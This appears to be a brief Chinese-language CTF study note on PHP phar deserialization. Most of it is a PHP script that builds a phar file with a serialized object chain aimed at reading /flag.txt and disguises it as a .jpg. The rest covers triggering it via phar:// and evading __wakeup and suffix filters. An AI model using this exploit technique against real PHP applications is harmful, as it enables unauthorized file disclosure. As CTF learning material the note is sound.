phar

![1700913131273](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1700913131273.png)

先找这些函数，然后一步步找，最后根据模板写生成Phar的文件。

有脚本，

```
<?php
class FileList
{
    private $files;
    private $results;
    private $funcs;
    public function __construct(){
        $this->files=array();
        $a=new File('/flag.txt');
        array_push($this->files,$a);
    }
}
class File {
    public $filename;
    public function __construct($filename){
        $this->filename=$filename;
    }

}
class User
{
    public $db;
}
$a=new User();
$b=new FileList();
$a->db=$b;
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置sutb
$phar->setMetadata($a);//将自定义的meta-data存入manifest
$phar->addFromString("1.txt","123123>");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
unlink('./phar.jpg');
rename("./phar.phar","./phar.jpg");
```

模板

[[HNCTF 2022 WEEK3\]ez_phar | NSSCTF](https://www.nssctf.cn/problem/3018)

这道题使用模板写完。

我的理解是Phar反序列化就是正常反序列化+phar是读取。格式都差不多。

写完提交上传。然后使用phar://读取。（如果说要jpg,png....）等格式的，改个后缀直接传。

[[NSSRound#4 SWPU\]1zweb(revenge) | NSSCTF](https://www.nssctf.cn/problem/2493)

[php(phar)反序列化漏洞及各种绕过姿势_phar反序列化漏洞-CSDN博客](https://blog.csdn.net/MrWangisgoodboy/article/details/130146658?ops_request_misc=%7B%22request%5Fid%22%3A%22170262226016800188510421%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170262226016800188510421&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-130146658-null-null.142^v96^pc_search_result_base1&utm_term=php反序列化绕过异常&spm=1018.2226.3001.4187)

这个就是phar，然后他过滤了后缀，。我们需要压缩。其中有个wakeup(),再phar中改对象数目，但是签名对照不上，就需要用脚本改。

然后再压缩